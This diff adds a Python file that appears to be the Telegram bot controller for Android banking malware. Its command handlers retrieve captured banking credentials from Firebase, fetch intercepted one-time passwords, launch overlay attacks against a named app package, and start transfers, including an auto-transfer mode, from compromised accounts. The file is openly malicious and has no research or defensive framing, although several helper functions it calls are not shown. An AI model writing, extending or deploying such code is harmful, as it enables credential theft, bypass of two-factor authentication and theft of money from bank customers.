@@ -1,0 +1,26 @@
+# banking_bot_commands.py
+@bot.message_handler(commands=['banking'])
+def handle_banking(message):
+    commands = """
+    🏦 Banking Commands:
+    /get_credentials - Get captured banking credentials
+    /get_otps - Get intercepted OTPs
+    /start_overlay <package> - Start overlay attack
+    /transfer <bank> <amount> <account> - Initiate transfer
+    /balance - Check compromised account balances
+    /auto_transfer - Enable auto-transfer mode
+    """
+    bot.reply_to(message, commands)
+
+@bot.message_handler(commands=['get_credentials'])
+def get_credentials(message):
+    # Fetch from Firebase and decrypt
+    credentials = fetch_credentials_from_firebase()
+    bot.reply_to(message, format_credentials(credentials))
+
+@bot.message_handler(commands=['start_overlay'])
+def start_overlay(message):
+    package = message.text.split()[1]
+    # Send command to device to start overlay attack
+    send_overlay_command(package)
+    bot.reply_to(message, f"Overlay attack started for {package}")
